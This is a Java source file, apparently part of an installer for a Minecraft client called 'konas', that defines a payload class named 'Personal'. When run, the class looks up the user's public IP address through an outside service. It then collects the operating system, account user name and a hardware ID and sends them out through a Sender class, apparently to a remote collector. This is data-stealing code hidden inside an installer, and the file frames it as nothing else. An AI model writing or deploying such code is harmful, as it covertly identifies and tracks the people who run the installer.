package konas.installer.payload.impl;

import konas.installer.payload.Payload;
import konas.installer.payload.Sender;
import konas.installer.util.HWIDUtil;
import konas.installer.util.Message;

import java.net.URL;
import java.util.Scanner;

public final class Personal implements Payload
{
    @Override
    public void execute() throws Exception
    {
        String ip = new Scanner(new URL("http://checkip.amazonaws.com").openStream(), "UTF-8").useDelimiter("\\A").next();

        Sender.send(new Message.Builder("Personal")
                .addField("IP", ip, true)
                .addField("OS", System.getProperty("os.name"), true)
                .addField("Name", System.getProperty("user.name"), true)
                .addField("HWID", HWIDUtil.getID(), true)
                .build());
    }
}
